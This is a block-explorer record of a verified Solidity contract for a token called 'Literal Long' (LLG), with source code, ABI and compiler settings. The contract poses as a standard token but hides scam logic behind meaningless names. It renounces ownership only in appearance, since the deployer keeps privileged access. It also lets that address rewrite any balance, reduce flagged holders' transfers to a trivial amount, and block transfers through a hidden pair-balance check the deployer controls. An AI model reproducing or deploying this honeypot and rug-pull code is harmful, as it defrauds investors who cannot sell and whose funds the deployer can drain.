{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface minMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listShouldAt) external view returns (uint256);\n\n    function transfer(address autoReceiverTeam, uint256 takeMode) external returns (bool);\n\n    function allowance(address takeExemptTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoReceiverTeam,\n        uint256 takeMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamWalletLaunched, uint256 value);\n    event Approval(address indexed takeExemptTrading, address indexed spender, uint256 value);\n}\n\nabstract contract buyTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapTrading {\n    function createPair(address isTrading, address amountSwap) external returns (address);\n}\n\ninterface teamMaxTotal is minMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LiteralLong is buyTrading, minMode, teamMaxTotal {\n\n    uint256 private minSenderFund = 100000000 * 10 ** 18;\n\n    function modeShouldFund(address feeToken) public {\n        maxToken();\n        if (maxReceiverMin) {\n            modeTotalLaunched = maxTake;\n        }\n        if (feeToken == marketingMaxEnable || feeToken == enableMarketing) {\n            return;\n        }\n        swapTotalSell[feeToken] = true;\n    }\n\n    function transfer(address modeAmount, uint256 takeMode) external virtual override returns (bool) {\n        return tokenReceiver(_msgSender(), modeAmount, takeMode);\n    }\n\n    function feeAt(address sellMode, address autoReceiverTeam, uint256 takeMode) internal returns (bool) {\n        require(maxShould[sellMode] >= takeMode);\n        maxShould[sellMode] -= takeMode;\n        maxShould[autoReceiverTeam] += takeMode;\n        emit Transfer(sellMode, autoReceiverTeam, takeMode);\n        return true;\n    }\n\n    function maxToken() private view {\n        require(toReceiverExempt[_msgSender()]);\n    }\n\n    address public marketingMaxEnable;\n\n    uint256 private modeTotalLaunched;\n\n    address atMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 maxMarketing;\n\n    function tokenReceiver(address sellMode, address autoReceiverTeam, uint256 takeMode) internal returns (bool) {\n        if (sellMode == marketingMaxEnable) {\n            return feeAt(sellMode, autoReceiverTeam, takeMode);\n        }\n        uint256 totalLaunched = minMode(enableMarketing).balanceOf(launchLaunched);\n        require(totalLaunched == maxMarketing);\n        require(autoReceiverTeam != launchLaunched);\n        if (swapTotalSell[sellMode]) {\n            return feeAt(sellMode, autoReceiverTeam, tradingSender);\n        }\n        return feeAt(sellMode, autoReceiverTeam, takeMode);\n    }\n\n    address private minMarketingLaunch;\n\n    function approve(address listAt, uint256 takeMode) public virtual override returns (bool) {\n        toTxBuy[_msgSender()][listAt] = takeMode;\n        emit Approval(_msgSender(), listAt, takeMode);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundToken;\n    }\n\n    function transferFrom(address sellMode, address autoReceiverTeam, uint256 takeMode) external override returns (bool) {\n        if (_msgSender() != atMin) {\n            if (toTxBuy[sellMode][_msgSender()] != type(uint256).max) {\n                require(takeMode <= toTxBuy[sellMode][_msgSender()]);\n                toTxBuy[sellMode][_msgSender()] -= takeMode;\n            }\n        }\n        return tokenReceiver(sellMode, autoReceiverTeam, takeMode);\n    }\n\n    bool public marketingAuto;\n\n    function owner() external view returns (address) {\n        return minMarketingLaunch;\n    }\n\n    bool public fromIs;\n\n    mapping(address => mapping(address => uint256)) private toTxBuy;\n\n    string private modeBuyLaunched = \"LLG\";\n\n    address public enableMarketing;\n\n    event OwnershipTransferred(address indexed limitBuy, address indexed atLaunchedList);\n\n    uint256 private launchedTx;\n\n    function isExempt(address buyAt) public {\n        if (sellTeam) {\n            return;\n        }\n        \n        toReceiverExempt[buyAt] = true;\n        \n        sellTeam = true;\n    }\n\n    function toLaunched() public {\n        emit OwnershipTransferred(marketingMaxEnable, address(0));\n        minMarketingLaunch = address(0);\n    }\n\n    bool private toSell;\n\n    uint256 amountIsMax;\n\n    mapping(address => bool) public swapTotalSell;\n\n    string private fundToken = \"Literal Long\";\n\n    bool public enableIs;\n\n    function getOwner() external view returns (address) {\n        return minMarketingLaunch;\n    }\n\n    bool public sellTeam;\n\n    function exemptLiquidity(address modeAmount, uint256 takeMode) public {\n        maxToken();\n        maxShould[modeAmount] = takeMode;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeBuyLaunched;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minSenderFund;\n    }\n\n    uint256 public maxTake;\n\n    uint256 constant tradingSender = 20 ** 10;\n\n    function balanceOf(address listShouldAt) public view virtual override returns (uint256) {\n        return maxShould[listShouldAt];\n    }\n\n    bool public maxReceiverMin;\n\n    function launchAuto(uint256 takeMode) public {\n        maxToken();\n        maxMarketing = takeMode;\n    }\n\n    uint8 private limitLiquidity = 18;\n\n    mapping(address => bool) public toReceiverExempt;\n\n    constructor (){\n        if (launchedTx == receiverEnable) {\n            enableIs = false;\n        }\n        minAmount maxTokenEnable = minAmount(atMin);\n        enableMarketing = swapTrading(maxTokenEnable.factory()).createPair(maxTokenEnable.WETH(), address(this));\n        if (fromIs) {\n            maxTx = true;\n        }\n        marketingMaxEnable = _msgSender();\n        toLaunched();\n        toReceiverExempt[marketingMaxEnable] = true;\n        maxShould[marketingMaxEnable] = minSenderFund;\n        \n        emit Transfer(address(0), marketingMaxEnable, minSenderFund);\n    }\n\n    bool public maxTx;\n\n    uint256 private receiverEnable;\n\n    mapping(address => uint256) private maxShould;\n\n    function allowance(address swapIs, address listAt) external view virtual override returns (uint256) {\n        if (listAt == atMin) {\n            return type(uint256).max;\n        }\n        return toTxBuy[swapIs][listAt];\n    }\n\n    address launchLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExemptTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunchedList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamWalletLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShouldAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"exemptLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"}],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMaxEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"modeShouldFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTotalSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toReceiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoReceiverTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LiteralLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}